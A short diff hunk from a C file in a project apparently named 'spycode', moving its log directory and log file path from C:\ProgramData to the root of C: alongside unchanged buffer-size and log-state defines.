@@ -16,8 +16,8 @@
 #define CODE_LEN 32
 #define MAX_LOG (TIME_LEN + sizeof(DWORD) + PATH_LEN + TEXT_LEN + CODE_LEN + 1)
 
-#define LOGPATH "C:\\ProgramData\\spycode"
-#define LOGFILE "C:\\ProgramData\\spycode\\log.dat"
+#define LOGPATH "C:\\spycode"
+#define LOGFILE "C:\\spycode\\log.dat"
 
 #define LOGSTART 0
 #define LOGSTOP 1
